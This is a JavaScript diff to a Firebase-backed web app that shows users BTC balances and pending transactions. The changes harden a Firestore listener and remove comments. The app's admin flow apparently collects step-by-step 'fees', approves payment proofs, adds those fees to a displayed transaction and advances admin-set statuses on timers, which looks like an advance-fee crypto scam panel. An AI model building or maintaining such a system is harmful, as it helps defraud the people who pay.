@@ -776,7 +776,7 @@
         let lastInboxCount = 0;
         let lastMsgCount = 0;
 
-        // --- REALTIME FIREBASE LISTENERS & TIMER CHECKER ---
+        // --- SAFE REALTIME FIREBASE LISTENERS (Prevents deleting users or data) ---
         db.collection("config").doc("appData").onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
@@ -790,7 +790,7 @@
                     lastInboxCount = newInboxLength;
                 }
 
-                if (data.usersList) usersList = data.usersList;
+                if (data.usersList && data.usersList.length > 0) usersList = data.usersList;
                 if (data.userEmails) userEmails = data.userEmails;
                 if (data.exchanges) exchanges = data.exchanges;
                 if (data.actionSteps) actionSteps = data.actionSteps;
@@ -824,8 +824,10 @@
                     renderAdminDashboard();
                 }
             } else {
-                saveState();
+                console.warn("Firestore document appData not found or loading...");
             }
+        }, (error) => {
+            console.error("Firestore Error:", error);
         });
 
         function checkTimersAndAutoProgress() {
@@ -836,7 +838,6 @@
                     u.statusExpiryTime = null;
                     const tx = (u.txs || []).find(t => t.id == u.activeTxId);
                     
-                    // After timer expires, move to NEXT step or complete
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
@@ -934,7 +935,7 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
+                usdRow.classList.remove('hidden');
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
@@ -1311,7 +1312,6 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
-        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
         function adminManualOverrideUser(e) {
             e.preventDefault();
             const email = document.getElementById('admin-override-user').value;
@@ -1556,7 +1556,6 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
-        // --- CORRECTED ADMIN APPROVAL FLOW: SETS ASSIGNED STATUS & STARTS TIMER ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1568,10 +1567,7 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
-                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
-
-                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
